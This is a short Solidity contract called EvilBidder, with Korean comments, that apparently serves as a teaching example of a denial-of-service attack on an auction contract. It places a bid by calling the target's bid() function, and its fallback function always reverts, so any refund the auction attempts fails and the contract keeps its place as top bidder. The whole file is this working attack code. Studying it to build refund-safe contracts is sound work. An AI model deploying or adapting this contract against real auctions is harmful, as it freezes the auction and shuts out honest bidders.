pragma solidity^0.4.11;
contract EvilBidder{
    //fallback함수
    //Auction 계약이 입찰금을 반환할 때 호출됨
    function() payable {
        revert(); // revert()함수가 호출되면 예외가 발생한다
    }
    
    //입찰 처리 함수 
    //인자로 받은 address의 bid()함수를 msg.value금액을 송금하는 형태로 호출함
    function bid(address _to) public payable {
        //입찰 처리 
        if(!_to .call.value(msg.value)(bytes4(sha3("bid()")))){
            throw;
        }
    }
}